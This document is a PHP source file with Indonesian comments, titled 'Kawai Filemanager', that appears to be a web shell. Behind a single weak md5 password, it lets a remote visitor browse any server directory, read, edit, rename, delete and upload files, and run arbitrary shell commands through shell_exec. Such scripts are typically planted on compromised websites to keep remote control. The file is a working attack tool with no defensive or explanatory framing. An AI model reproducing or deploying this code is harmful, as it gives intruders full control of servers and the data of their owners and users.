<?php
session_start();

// Ganti password ini (gunakan md5 hash)
define('PASSWORD_HASH', md5('UNO')); // Ubah 'admin123' sesuai keinginan

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Login
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === PASSWORD_HASH) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Password salah.";
    }
}

// Jika belum login
if (!isset($_SESSION['logged_in'])):
?>
<!DOCTYPE html>
<html>
<head>
    <title>Kawai Filemanager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
</head>
<body class="container mt-5">
<div class="row justify-content-center">
    <div class="col-md-4">
        <center>
            <img src="https://static.vecteezy.com/system/resources/thumbnails/041/441/821/small/ai-generated-graphics-of-joyful-kawaii-cat-and-laptop-png.png" style="width:100px;">
        </center>
        <h3 class="text-center">Kawai Filemanager</h3>
        <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
        <form method="POST">
            <div class="mb-3">
                <label>Password</label>
                <input type="password" name="password" class="form-control" required>
            </div>
            <button class="btn btn-primary w-100">Login</button>
        </form>
    </div>
</div>
</body>
</html>
<?php
exit;
endif;

// Direktori aktif
$defaultDir = __DIR__;
$currentDir = isset($_POST['targetDir']) && is_dir($_POST['targetDir']) ? realpath($_POST['targetDir']) : $defaultDir;

// Fungsi tampil file/folder
function listFiles($dir) {
    $files = scandir($dir);
    $folders = [];
    $normalFiles = [];

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($fullPath) ? $folders[] = $file : $normalFiles[] = $file;
    }

    // Menampilkan folder terlebih dahulu
    echo '<table class="table table-bordered mt-4"><thead class="table-dark"><tr><th>Nama</th><th>Aksi</th></tr></thead><tbody>';

    foreach (array_merge($folders, $normalFiles) as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        $isDir = is_dir($filePath);
        $targetDirEncoded = htmlspecialchars(realpath($filePath));
        $icon = $isDir ? '<i class="fa fa-folder text-warning"></i>' : '<i class="fa fa-file text-secondary"></i>';
        $fileLink = "<a href='#' onclick=\"event.preventDefault(); document.getElementById('goto-$file').submit();\">$icon $file</a>";

        echo "<tr><td>$fileLink</td><td>";
        echo "<form id='goto-$file' method='POST' style='display:none;'>
                <input type='hidden' name='targetDir' value='$targetDirEncoded'>
              </form>";

        if (!$isDir) {
            echo "<form method='POST' style='display:inline-block'>
                    <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
                    <input type='hidden' name='readFile' value='" . htmlspecialchars($filePath) . "'>
                    <button class='btn btn-sm btn-info'>Baca</button>
                  </form>
                  <form method='POST' style='display:inline-block'>
                    <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
                    <input type='hidden' name='editFile' value='" . htmlspecialchars($filePath) . "'>
                    <button class='btn btn-sm btn-warning'>Edit</button>
                  </form>";
        }

        echo "<form method='POST' style='display:inline-block'>
                <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
                <input type='hidden' name='renameFile' value='" . htmlspecialchars($filePath) . "'>
                <input type='text' name='newName' placeholder='Nama baru' required>
                <button class='btn btn-sm btn-secondary'>Rename</button>
              </form>
              <form method='POST' style='display:inline-block' onsubmit=\"return confirm('Yakin ingin hapus?');\">
                <input type='hidden' name='targetDir' value='" . htmlspecialchars($dir) . "'>
                <input type='hidden' name='deleteFile' value='" . htmlspecialchars($filePath) . "'>
                <button class='btn btn-sm btn-danger'>Hapus</button>
              </form>";

        echo "</td></tr>";
    }

    echo '</tbody></table>';
}

// Upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile'])) {
    if ($_FILES['uploadFile']['error'] === UPLOAD_ERR_OK) {
        $uploadName = basename($_FILES['uploadFile']['name']);
        $uploadPath = $currentDir . DIRECTORY_SEPARATOR . $uploadName;
        if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadPath)) {
            echo "<div class='alert alert-success'>File berhasil diupload ke: $uploadPath</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
        }
    }
}

// Hapus file
if (isset($_POST['deleteFile']) && file_exists($_POST['deleteFile'])) {
    unlink($_POST['deleteFile']);
    echo "<div class='alert alert-warning'>File dihapus: " . htmlspecialchars($_POST['deleteFile']) . "</div>";
}

// Rename file
if (isset($_POST['renameFile'], $_POST['newName']) && file_exists($_POST['renameFile'])) {
    $oldPath = $_POST['renameFile'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['newName']);
    rename($oldPath, $newPath);
    echo "<div class='alert alert-info'>File diubah menjadi: " . htmlspecialchars($newPath) . "</div>";
}

// Simpan edit
if (isset($_POST['saveEdit']) && isset($_POST['filePath'])) {
    file_put_contents($_POST['filePath'], $_POST['fileContent']);
    echo "<div class='alert alert-success'>File berhasil disimpan.</div>";
}

// Tampilkan isi file
if (isset($_POST['readFile']) && file_exists($_POST['readFile'])) {
    $content = htmlspecialchars(file_get_contents($_POST['readFile']));
    echo "<div class='alert alert-secondary'><strong>Isi file:</strong><pre>$content</pre></div>";
}

// Tampilkan form edit file
if (isset($_POST['editFile']) && file_exists($_POST['editFile'])) {
    $content = htmlspecialchars(file_get_contents($_POST['editFile']));
    echo "<h3>Edit File: " . basename($_POST['editFile']) . "</h3>
    <form method='POST'>
        <input type='hidden' name='filePath' value='" . htmlspecialchars($_POST['editFile']) . "'>
        <input type='hidden' name='targetDir' value='" . htmlspecialchars($currentDir) . "'>
        <textarea name='fileContent' class='form-control' rows='10'>" . $content . "</textarea><br>
        <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
    </form><hr>";
}

// Jalankan shell command
if (isset($_POST['command'])) {
    $cmd = $_POST['command'];
    $output = shell_exec("cd " . escapeshellarg($currentDir) . " && $cmd 2>&1");
    echo "<div class='alert alert-dark'><strong>Hasil perintah:</strong><pre>" . htmlspecialchars($output) . "</pre></div>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager PHP</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
</head>
<body class="container mt-4">
    <h1><i class="fa fa-folder-open text-primary"></i> PHP File Manager</h1>
    <div class="text-end mb-3">
        <a href="?logout=1" class="btn btn-sm btn-outline-danger">Logout</a>
    </div>

    <!-- Pindah direktori -->
    <form method="POST" class="mb-4">
        <div class="input-group">
            <input type="text" name="targetDir" class="form-control" value="<?= htmlspecialchars($currentDir) ?>" required>
            <button type="submit" class="btn btn-outline-primary">Buka Direktori</button>
        </div>
    </form>

    <!-- Upload file -->
    <form method="POST" enctype="multipart/form-data" class="mb-4">
        <input type="hidden" name="targetDir" value="<?= htmlspecialchars($currentDir) ?>">
        <div class="input-group">
            <input type="file" name="uploadFile" class="form-control" required>
            <button class="btn btn-success" type="submit">Upload</button>
        </div>
    </form>

    <!-- Command shell -->
    <form method="POST" class="mb-4">
        <input type="hidden" name="targetDir" value="<?= htmlspecialchars($currentDir) ?>">
        <div class="mb-2">
            <label class="form-label"><strong>POST Command (Shell)</strong></label>
            <input type="text" name="command" class="form-control" placeholder="contoh: ls -lah" required>
        </div>
        <button class="btn btn-dark">Jalankan</button>
    </form>

    <?php listFiles($currentDir); ?>
</body>
</html>